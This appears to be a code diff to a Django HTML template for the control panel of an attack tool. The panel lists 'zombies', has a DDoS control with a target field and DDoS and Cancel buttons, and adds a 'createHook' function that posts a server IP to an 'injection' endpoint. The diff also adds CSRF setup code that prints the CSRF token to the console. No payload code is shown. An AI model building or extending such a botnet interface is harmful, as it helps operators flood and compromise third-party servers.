@@ -14,6 +14,46 @@
 
 <script>
 
+
+
+
+//cookie setup for posts
+    $(function ajax_setup(){
+            //get cookie for form posting
+            function getCookie(name) {
+                var cookieValue = null;
+                if (document.cookie && document.cookie != '') {
+                    var cookies = document.cookie.split(';');
+                    for (var i = 0; i < cookies.length; i++) {
+                        var cookie = jQuery.trim(cookies[i]);
+                        // Does this cookie string begin with the name we want?
+                        if (cookie.substring(0, name.length + 1) == (name + '=')) {
+                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                            break;
+                        }
+                    }
+                }
+                return cookieValue;
+            }
+
+            var csrftoken = getCookie('csrftoken');
+						console.log(csrftoken);
+            function csrfSafeMethod(method) {
+                // these HTTP methods do not require CSRF protection
+                return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
+            }
+
+
+            $.ajaxSetup({
+                beforeSend: function(xhr, settings) {
+                    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
+                        xhr.setRequestHeader("X-CSRFToken", csrftoken);
+                    }
+                }
+            })
+        }
+    )
+
 $(function(){
 	solo_socket = WS4Redis({
 		uri:'{{WEBSOCKET_URI}}attacker?subscribe-session',
@@ -54,12 +94,28 @@ function cancel(){
 
 }
 
+function createHook(){
+	var ipserver = $('#server_ip').val()
+	$.ajax({
+			url: "{%url 'injection'%}",
+			type: 'POST',
+			dataType: "json",
+			data:{'server_ip':ipserver},
+			success: function(json){
+
+
+				alert(json['resp'])
+			}
+	});
+}
+
 
 
 </script>
 
 </head>
 
+<body>
 
 <tr>
 {%for zombie in zombies%}
@@ -67,12 +123,18 @@ function cancel(){
 {%endfor%}
 </tr>
 
-<div>
+<div id="DDOS-control">
 <input id="target"/>
 <button onclick="ddos();" text="DDOS"/>
-
 <button onclick="cancel();",text="Cancel"/>
 </div>
 
+<div id="create-injection">
+		{% csrf_token %}
+	<input id="server_ip"/>
+	<button onclick="createHook();" text="Create Hook"/>
+
+</div>
+</body>
 
 </html>
